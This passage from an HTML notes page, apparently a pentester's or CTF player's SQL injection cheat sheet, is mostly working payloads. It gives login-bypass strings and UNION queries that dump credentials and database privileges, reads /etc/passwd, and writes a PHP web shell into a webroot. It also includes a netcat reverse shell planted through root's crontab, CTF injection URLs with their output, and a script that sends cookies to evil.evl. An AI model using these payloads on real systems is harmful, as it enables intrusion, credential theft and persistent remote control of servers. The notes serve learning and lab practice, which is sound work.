+     ╔═════════╗   ╔═════════╗   ╔═════════╗    ╔═════════╗
+     ║  UNION  ║   ║  ERROR  ║   ║ BOOLEAN ║    ║  TIME   ║
+     ╚═════════╝   ╚═════════╝   ╚═════════╝    ╚═════════╝
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>Blind - (or inferial) - bool - time</p></li>
+<li><p>In Band - Error based - Union based</p></li>
+<li><p>Out Of Band -&gt; attacker is unable to use the same channel to launch the attack and gather results.</p></li>
+</ul>
+</section>
+<section id="mysql-sqli-cheat-sheat">
+<h2>MySQL sqli cheat sheat<a class="headerlink" href="#mysql-sqli-cheat-sheat" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&#39;                   String terminator
+&quot;                   String terminator
+;                   Query terminator
+-- -                Removes the rest of the query
+#                   Removes the rest of the query
+/*comment this*/    Can be placed anywhere in a query, used for bypassing weak filters
+&#39;-- -               End a string and remove rest of the query
+&#39;;-- -              End a string, end query, and remove rest of the query
+OR 1=1-- -          For integers, true test
+OR 1=2-- -          For integers, false test
+&#39; OR &#39;1&#39;=&#39;1&#39;-- -    For strings, test test
+AND 1=1-- -         For integers, true test
+AND 1=2-- -         For integers, false test
+&#39; AND &#39;1&#39;=&#39;1&#39;-- -   For strings, true test
+?id=2-1             For integers, arithmetic operation would load the resultant post
+OR sleep(5)-- -     Blind test
+
+&#39;    %27
+&quot;    %22
+#    %23
+;    %3B
+)    %29
+</pre></div>
+</div>
+</section>
+<section id="mysql-fingerprinting">
+<h2>MySQL Fingerprinting<a class="headerlink" href="#mysql-fingerprinting" title="Permalink to this heading">#</a></h2>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="k">SELECT</span><span class="w"> </span><span class="o">@@</span><span class="k">version</span><span class="w">    </span><span class="n">Works</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">MSSQL</span>
+<span class="k">SELECT</span><span class="w"> </span><span class="n">POW</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="w">     </span><span class="n">Will</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="n">Error</span><span class="o">-</span><span class="k">out</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">other</span><span class="w"> </span><span class="n">DBMS</span>
+<span class="k">SELECT</span><span class="w"> </span><span class="n">SLEEP</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span><span class="w">     </span><span class="n">Delays</span><span class="w"> </span><span class="mi">5</span><span class="w"> </span><span class="n">sec</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="k">only</span><span class="w"> </span><span class="k">no</span><span class="w"> </span><span class="n">delay</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">other</span><span class="w"> </span><span class="n">DBMS</span>
+</pre></div>
+</div>
+</section>
+<section id="login-evasion">
+<h2>Login evasion<a class="headerlink" href="#login-evasion" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">admin</span><span class="s1">&#39;)--</span>
+<span class="n">admin</span><span class="s1">&#39; OR 1=1-- -</span>
+<span class="s1">&#39; OR &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span>
+<span class="s1">&#39; OR &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span><span class="s1">&#39;;-- -</span>
+<span class="s1">&#39; OR true -- -</span>
+</pre></div>
+</div>
+</section>
+<section id="union-sqli">
+<h2>Union SQLi<a class="headerlink" href="#union-sqli" title="Permalink to this heading">#</a></h2>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="o">#</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="k">data</span><span class="w"> </span><span class="n">types</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">selected</span><span class="w"> </span><span class="n">columns</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="k">all</span><span class="w"> </span><span class="n">positions</span><span class="w"> </span><span class="n">should</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">same</span>
+<span class="o">#</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">two</span><span class="w"> </span><span class="n">queries</span><span class="w"> </span><span class="n">should</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">same</span><span class="w"> </span><span class="nb">number</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">columns</span>
+<span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">ports</span><span class="p">;</span>
+<span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">ships</span><span class="p">;</span>
+<span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">ports</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">ships</span><span class="p">;</span>
+
+<span class="o">#</span><span class="w"> </span><span class="n">We</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">inject</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">input</span><span class="p">,</span><span class="w"> </span><span class="n">such</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="k">rows</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">another</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="k">are</span><span class="w"> </span><span class="n">returned</span><span class="p">:</span>
+<span class="o">#</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">above</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="n">would</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">entries</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">passwords</span><span class="w"> </span><span class="k">table</span><span class="p">,</span><span class="w"> </span><span class="n">assuming</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">products</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="n">two</span><span class="w"> </span><span class="n">columns</span><span class="p">.</span>
+<span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">products</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">product_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;1&#39;</span>
+<span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">products</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">product_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">passwords</span><span class="c1">-- &#39;</span>
+
+<span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">products</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">product_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">passwords</span>
+<span class="o">#</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">sometimes</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">necessary</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">inject</span><span class="w"> </span><span class="n">junk</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">filling</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">original</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="k">more</span><span class="w"> </span><span class="n">columns</span><span class="w"> </span><span class="k">than</span><span class="w"> </span><span class="n">needed</span>
+<span class="o">#</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">injecting</span><span class="w"> </span><span class="n">junk</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;NULL&#39;</span><span class="w"> </span><span class="n">fits</span><span class="w"> </span><span class="k">all</span><span class="w"> </span><span class="k">data</span><span class="w"> </span><span class="n">types</span><span class="p">.</span>
+<span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">products</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">product_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">passwords</span>
+
+<span class="o">#</span><span class="w"> </span><span class="n">leaking</span><span class="w"> </span><span class="k">some</span><span class="w"> </span><span class="n">stuff</span>
+<span class="s1">&#39; UNION SELECT * FROM users-- -</span>
+<span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">,</span><span class="k">user</span><span class="p">()</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="c1">-- -</span>
+</pre></div>
+</div>
+</section>
+<section id="detect-number-of-columns-with-order-clause">
+<h2>Detect number of columns with order clause<a class="headerlink" href="#detect-number-of-columns-with-order-clause" title="Permalink to this heading">#</a></h2>
+<p>use order by until the column number doesn’t exist</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="s1">&#39; ORDER BY 1-- -</span>
+<span class="s1">&#39; ORDER BY 2-- -</span>
+<span class="s1">&#39; ORDER BY 3-- -</span>
+<span class="s1">&#39; ORDER BY 4-- -</span>
+<span class="s1">&#39; ORDER BY 5-- -</span>
+</pre></div>
+</div>
+</section>
+<section id="detect-number-of-columns-with-union-clause">
+<h2>Detect number of columns with union clause<a class="headerlink" href="#detect-number-of-columns-with-union-clause" title="Permalink to this heading">#</a></h2>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="n">cn</span><span class="s1">&#39; UNION SELECT 1-- -</span>
+<span class="s1">cn&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="c1">-- -</span>
+<span class="n">cn</span><span class="s1">&#39; UNION SELECT 1,2,3-- -   # and so on</span>
+<span class="s1">cn&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="o">@@</span><span class="k">version</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="c1">-- -  # # attempting to get the version in the second column</span>
+</pre></div>
+</div>
+</section>
+<section id="information-schema-database">
+<h2>Information schema database<a class="headerlink" href="#information-schema-database" title="Permalink to this heading">#</a></h2>
+<p>will dump a list of all the database on the server</p>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">my_database</span><span class="p">.</span><span class="n">users</span><span class="p">;</span>
+<span class="k">SELECT</span><span class="w"> </span><span class="k">SCHEMA_NAME</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">SCHEMATA</span><span class="p">;</span>
+</pre></div>
+</div>
+</section>
+<section id="id2">
+<h2>Databases<a class="headerlink" href="#id2" title="Permalink to this heading">#</a></h2>
+<p>union sqli to get all the database names</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cn</span><span class="s1">&#39; UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -</span>
+</pre></div>
+</div>
+</section>
+<section id="database-in-use">
+<h2>Database in use<a class="headerlink" href="#database-in-use" title="Permalink to this heading">#</a></h2>
+<p>use database() to get the currently used database</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cn</span><span class="s1">&#39; UNION select 1,database(),2,3-- -</span>
+</pre></div>
+</div>
+</section>
+<section id="id3">
+<h2>Tables<a class="headerlink" href="#id3" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1"># TABLE_SCHEMA column points to the database each table belongs to</span>
+<span class="c1"># TABLE_NAME column stores table names</span>
+<span class="n">cn</span><span class="s1">&#39; UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema=&#39;</span><span class="n">dev</span><span class="s1">&#39;-- -</span>
+</pre></div>
+</div>
+</section>
+<section id="columns">
+<h2>Columns<a class="headerlink" href="#columns" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cn</span><span class="s1">&#39; UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name=&#39;</span><span class="n">credentials</span><span class="s1">&#39;-- -</span>
+</pre></div>
+</div>
+</section>
+<section id="data">
+<h2>Data<a class="headerlink" href="#data" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cn</span><span class="s1">&#39; UNION select 1, username, password, 4 from dev.credentials-- -</span>
+<span class="n">cn</span><span class="s1">&#39; UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables-- -</span>
+</pre></div>
+</div>
+</section>
+<section id="privileges">
+<h2>Privileges<a class="headerlink" href="#privileges" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1"># different ways to get current user</span>
+<span class="n">SELECT</span> <span class="n">USER</span><span class="p">()</span>
+<span class="n">SELECT</span> <span class="n">CURRENT_USER</span><span class="p">()</span>
+<span class="n">SELECT</span> <span class="n">user</span> <span class="kn">from</span> <span class="nn">mysql.user</span>
+
+<span class="c1"># union injection payloads to get current user</span>
+<span class="n">cn</span><span class="s1">&#39; UNION SELECT 1, user, 3, 4 from mysql.user-- -</span>
+<span class="n">cn</span><span class="s1">&#39; UNION SELECT 1, user(), 3, 4-- -</span>
+
+<span class="c1"># check if we have super admin privileges</span>
+<span class="n">SELECT</span> <span class="n">super_priv</span> <span class="n">FROM</span> <span class="n">mysql</span><span class="o">.</span><span class="n">user</span>
+
+<span class="c1"># the same as an injection payload</span>
+<span class="n">cn</span><span class="s1">&#39; UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -</span>
+
+<span class="c1"># only showing root if multiple users in the database</span>
+<span class="n">cn</span><span class="s1">&#39; UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user=&quot;root&quot;-- -</span>
+
+<span class="c1"># dump all the privileges we have from the information_schema</span>
+<span class="n">SELECT</span> <span class="n">sql_grants</span> <span class="n">FROM</span> <span class="n">information_schema</span><span class="o">.</span><span class="n">sql_show_grants</span>
+
+<span class="c1"># the same as an injection payload</span>
+<span class="n">cn</span><span class="s1">&#39; UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name=&quot;secure_file_priv&quot;-- -</span>
+
+<span class="c1"># good risk mitigation practice</span>
+<span class="c1"># create a read only account for the webapp and GRANT only SELECT privilege to it</span>
+<span class="c1"># Also don&#39;t forget to give a shitty password</span>
+<span class="n">CREATE</span> <span class="n">USER</span> <span class="s1">&#39;reader&#39;</span><span class="o">@</span><span class="s1">&#39;localhost&#39;</span><span class="p">;</span>
+<span class="n">GRANT</span> <span class="n">SELECT</span> <span class="n">ON</span> <span class="n">ilfreight</span><span class="o">.</span><span class="n">ports</span> <span class="n">TO</span> <span class="s1">&#39;reader&#39;</span><span class="o">@</span><span class="s1">&#39;localhost&#39;</span> <span class="n">IDENTIFIED</span> <span class="n">BY</span> <span class="s1">&#39;p@ssw0Rd!!&#39;</span><span class="p">;</span>
+</pre></div>
+</div>
+</section>
+<section id="reading-files">
+<h2>Reading files<a class="headerlink" href="#reading-files" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1"># We need to have FILE priviledge granted for that but if we do it gets interesting</span>
+<span class="c1"># MySQL user also needs to have enough privileges to read it.</span>
+<span class="n">SELECT</span> <span class="n">LOAD_FILE</span><span class="p">(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">);</span>
+
+<span class="c1"># union injection payload to dump /etc/passwd in the table</span>
+<span class="n">cn</span><span class="s1">&#39; UNION SELECT 1, LOAD_FILE(&quot;/etc/passwd&quot;), 3, 4-- -</span>
+</pre></div>
+</div>
+</section>
+<section id="writing-files">
+<h2>Writing files<a class="headerlink" href="#writing-files" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1"># requirements</span>
+<span class="mi">1</span>  <span class="o">-</span> <span class="n">User</span> <span class="k">with</span> <span class="n">FILE</span> <span class="n">privilege</span> <span class="n">enabled</span>
+<span class="mi">2</span>  <span class="o">-</span> <span class="n">MySQL</span> <span class="k">global</span> <span class="n">secure_file_priv</span> <span class="n">variable</span> <span class="ow">not</span> <span class="n">enabled</span>
+<span class="mi">3</span>  <span class="o">-</span> <span class="n">Write</span> <span class="n">access</span> <span class="n">to</span> <span class="n">the</span> <span class="n">location</span> <span class="n">we</span> <span class="n">want</span> <span class="n">to</span> <span class="n">write</span> <span class="n">to</span> <span class="n">on</span> <span class="n">the</span> <span class="n">back</span><span class="o">-</span><span class="n">end</span> <span class="n">server</span>
+</pre></div>
+</div>
+</section>
+<section id="secure-file-priv">
+<h2>Secure file priv<a class="headerlink" href="#secure-file-priv" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1"># variable is used to determine where to read/write files from</span>
+<span class="c1"># empty value lets us read files from the entire file system</span>
+<span class="c1"># NULL means we cannot read/write from any directory</span>
+<span class="c1"># MariaDB -&gt; empty by default</span>
+<span class="c1"># MySQL -&gt; /var/lib/mysql-files or NULL by default</span>
+<span class="n">secure_file_priv</span>
+
+<span class="c1"># check secure_file_priv</span>
+<span class="n">SHOW</span> <span class="n">VARIABLES</span> <span class="n">LIKE</span> <span class="s1">&#39;secure_file_priv&#39;</span><span class="p">;</span>
+
+<span class="c1"># check secure_file_priv from the global_variables table</span>
+<span class="n">SELECT</span> <span class="n">variable_name</span><span class="p">,</span> <span class="n">variable_value</span> <span class="n">FROM</span> <span class="n">information_schema</span><span class="o">.</span><span class="n">global_variables</span> <span class="n">where</span> <span class="n">variable_name</span><span class="o">=</span><span class="s2">&quot;secure_file_priv&quot;</span>
+
+<span class="c1"># check secure_file_priv from the global_variables table over a union injection</span>
+<span class="n">cn</span><span class="s1">&#39; UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name=&quot;secure_file_priv&quot;-- -</span>
+</pre></div>
+</div>
+</section>
+<section id="select-into-outfile">
+<h2>Select into outfile<a class="headerlink" href="#select-into-outfile" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span># dump all content of users table into file
+SELECT * from users INTO OUTFILE &#39;/tmp/credentials&#39;;
+
+# dump arbitrary text into file
+SELECT &#39;this is a test&#39; INTO OUTFILE &#39;/tmp/test.txt&#39;;
+
+# writing text into the webroot of the webserver
+SELECT &#39;file written successfully!&#39; INTO OUTFILE &#39;/var/www/html/proof.txt&#39;
+
+# writing text into the webroot of the webserver over a union injection
+# will print -&gt; &quot;1file written successfully!34&quot;
+cn&#39; UNION SELECT 1,&#39;file written successfully!&#39;,3,4 INTO OUTFILE &#39;/var/www/html/proof.txt&#39;-- -
+
+# using &quot;&quot; for the UNION to get a cleaner output in the text file
+# will print -&gt; &quot; file written successfully!  &quot;
+cn&#39; UNION SELECT &quot;&quot;,&#39;file written successfully!&#39;,&quot;&quot;,&quot;&quot; INTO OUTFILE &#39;/var/www/html/proof.txt&#39;-- -
+
+# using the concept to upload a webshell
+# will print -&gt; &quot; &lt;?php system($_REQUEST[0]); ?&gt;  &quot;
+# the use the shell by giving your command to the parameter 0
+# 10.10.10.10:8081/shell.php?0=cat+/etc/passwd
+cn&#39; UNION SELECT &quot;&quot;,&#39;&lt;?php system($_REQUEST[0]); ?&gt;&#39;, &quot;&quot;, &quot;&quot; INTO OUTFILE &#39;/var/www/html/shell.php&#39;-- -
+</pre></div>
+</div>
+</section>
+<section id="waf">
+<h2>WAF<a class="headerlink" href="#waf" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>ModSecurity - OpenSource
+CloudFlare - Paid
+
+cn&#39; UNION SELECT 1,&quot;file written successfully!&quot;,3,4,5 INTO OUTFILE &#39;/tmp/proof.txt&#39;-- -
+cn&#39; UNION SELECT 1,&#39;&lt;?php system($_REQUEST[0]); ?&gt;&#39;,3,4,5 INTO OUTFILE &#39;/tmp/proof.php&#39;-- -
+cn&#39; UNION SELECT 1,&#39;&lt;?php system($_REQUEST[0]); ?&gt;&#39;,3,4,5 INTO OUTFILE &#39;/tmp/proot.php&#39;-- -
+cn&#39; UNION SELECT &quot;&quot;,&#39;&lt;?php system($_REQUEST[0]); ?&gt;&#39;,&quot;&quot;,&quot;&quot;,&quot;&quot; INTO OUTFILE &#39;/tmp/shell.php&#39;-- -
+cn&#39; UNION SELECT &quot;&quot;,&#39;&lt;?php system($_REQUEST[0]); ?&gt;&#39;,&quot;&quot;,&quot;&quot;,&quot;&quot; INTO OUTFILE &#39;/www/shell.php&#39;-- -
+cn&#39; UNION SELECT &quot;&quot;,&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.22 1234 &gt;/tmp/f&#39;,&quot;&quot;,&quot;&quot;,&quot;&quot; INTO OUTFILE &#39;/tmp/shell.sh&#39;-- -
+cn&#39; UNION SELECT &quot;&quot;,&#39;* * * * * /tmp/shell.sh&#39;,&quot;&quot;,&quot;&quot;,&quot;&quot; INTO OUTFILE &#39;/var/spool/cron/crontabs/root&#39;-- -
+cn&#39; union select &quot;&quot;,&#39;&lt;?php system($_REQUEST[0]); ?&gt;&#39;,&quot;&quot;,&quot;&quot;,&quot;&quot; into outfile &#39;/var/www/html/shell.php&#39;-- -
+
+cn&#39; UNION SELECT 1, LOAD_FILE(&quot;/etc/crontab&quot;),3,4,5-- -
+cn&#39; UNION SELECT 1, LOAD_FILE(&quot;/etc/passwd&quot;),3,4,5-- -
+cn&#39; UNION SELECT 1, LOAD_FILE(&quot;/tmp/proot.php&quot;),3,4,5-- -
+cn&#39; UNION SELECT 1, LOAD_FILE(&quot;/var/www/dashboard.php&quot;),3,4,5-- -
+cn&#39; UNION SELECT 1, LOAD_FILE(&quot;/tmp/shell.sh&quot;),3,4,5-- -
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>https://ctf.tk/ctf/game/gallery-single-post.html?id=1%20union%20select%201,2,3,4,username,6%20FROM%20users
+
+https://ctf.tk/ctf/game/gallery-single-post.html?id=1%20union%20select%201,2,3,4,id,6%20FROM%20users
+https://ctf.tk/ctf/game/gallery-single-post.html?id=1%20union%20select%201,2,3,4,name,6%20FROM%20sqlite_master%20WHERE%20type=%27table%27
+
+https://ctf.tk/ctf/game/gallery-single-post.html?id=1%20union%20select%201,2,3,4,sql,6%20FROM%20sqlite_master%20WHERE%20type=%27table%27
+CREATE TABLE &quot;messages&quot; (id INTEGER PRIMARY KEY, fname CHAR(25), lname CHAR(25), address CHAR(100), email CHAR(50), phone CHAR(25), message CHAR(255)) 6 (2)
+
+https://ctf.tk/ctf/game/gallery-single-post.html?id=1%20union%20select%201,2,3,4,sql,6%20FROM%20sqlite_master%20WHERE%20type=%27table%27%20and%20tbl_name%20NOT%20like%20%27messages%27
+CREATE TABLE &quot;users&quot; (id INTEGER PRIMARY KEY, username CHAR(25), userimage CHAR(100), userbio CHAR(255), fname CHAR(25), lname CHAR(25)) 6 (2)
+
+https://ctf.tk/ctf/game/gallery-single-post.html?id=1%20union%20select%201,2,3,4,sql,6%20FROM%20sqlite_master%20WHERE%20type=%27table%27%20and%20tbl_name%20NOT%20like%20%27messages%27
+CREATE TABLE thisisnotthetableyourelookingfor (id INTEGER PRIMARY KEY, nothere TEXT) 6 (2)
+
+
+https://ctf.tk/ctf/game/gallery-single-post.html?id=1%20union%20select%201,2,3,4,nothere,6%20FROM%20thisisnotthetableyourelookingfor
+https://ctf.tk/ctf/game/gallery-single-post.html?id=-1%20union%20select%201,2,3,4,sql,6%20FROM%20sqlite_master%20WHERE%20type=%27table%27%20and%20tbl_name%20NOT%20like%20%27sqlite_%27%20limit%203%20offset%202;--%20-
+
+https://ctf.tk/ctf/game/gallery-single-post.html?id=-1%20union%20select%201,2,3,4,nothere,6%20FROM%20%27thisisnotthetableyourelookingfor%27%20limit%205%20offset%204;--%20-
+
+&lt;script&gt;
+new Image().src=&quot;https://evil.evl/cookiemonster.php?&quot;+document.cookie
+&lt;/script&gt;
+</pre></div>
+</div>
+</section>
+</section>
+
+        </article>
+      </div>
+      <footer>
+        
+        <div class="related-pages">
+          <a class="next-page" href="../webapp/webapp.html">
+              <div class="page-info">
+                <div class="context">
+                  <span>Next</span>
+                </div>
+                <div class="title">Web Apps</div>
+              </div>
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+            </a>
+          <a class="prev-page" href="../os-fundamentals/windows-fundamentals/windows-fundamentals.html">
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+              <div class="page-info">
+                <div class="context">
+                  <span>Previous</span>
+                </div>
+                
+                <div class="title">Windows OS Fundamentals</div>
+                
+              </div>
+            </a>
+        </div>
+        <div class="bottom-of-page">
+          <div class="left-details">
+            <div class="copyright">
+                Copyright &#169; 2023, blnkn
+            </div>
+            Made with <a href="https://www.sphinx-doc.org/">Sphinx</a> and <a class="muted-link" href="https://pradyunsg.me">@pradyunsg</a>'s
+            
+            <a href="https://github.com/pradyunsg/furo">Furo</a>
+            
+          </div>
+          <div class="right-details">
+            
+          </div>
+        </div>
+        
+      </footer>
+    </div>
+    <aside class="toc-drawer">
+      
+      
+      <div class="toc-sticky toc-scroll">
+        <div class="toc-title-container">
+          <span class="toc-title">
+            On this page
+          </span>
+        </div>
+        <div class="toc-tree-container">
+          <div class="toc-tree">
+            <ul>
+<li><a class="reference internal" href="#">SQLi</a><ul>
+<li><a class="reference internal" href="#injection-types">Injection types</a></li>
+<li><a class="reference internal" href="#query-types">Query types</a></li>
+<li><a class="reference internal" href="#use-cases">Use cases</a></li>
+<li><a class="reference internal" href="#interactions">Interactions</a></li>
+<li><a class="reference internal" href="#features">Features</a></li>
+<li><a class="reference internal" href="#types">Types</a></li>
+<li><a class="reference internal" href="#relational-databases">Relational databases</a></li>
+<li><a class="reference internal" href="#non-relational-databases">Non-relational databases</a></li>
+<li><a class="reference internal" href="#default-ports">Default ports</a></li>
+<li><a class="reference internal" href="#documentation">Documentation</a></li>
+<li><a class="reference internal" href="#mysql-client-commands">Mysql client commands</a></li>
+<li><a class="reference internal" href="#mysql-statements">mySQL statements</a></li>
+<li><a class="reference internal" href="#databases">DATABASES</a></li>
+<li><a class="reference internal" href="#tables">Tables</a></li>
+<li><a class="reference internal" href="#properties-keywords">Properties keywords</a></li>
+<li><a class="reference internal" href="#insert-statement">Insert statement</a></li>
+<li><a class="reference internal" href="#select-statement">Select statement</a></li>
+<li><a class="reference internal" href="#drop-statement">Drop statement</a></li>
+<li><a class="reference internal" href="#alter-statement">Alter statement</a></li>
+<li><a class="reference internal" href="#update-statement">Update statement</a></li>
+<li><a class="reference internal" href="#order-by">Order by</a></li>
+<li><a class="reference internal" href="#limit">Limit</a></li>
+<li><a class="reference internal" href="#where-clause">Where clause</a></li>
+<li><a class="reference internal" href="#like-clause">Like clause</a></li>
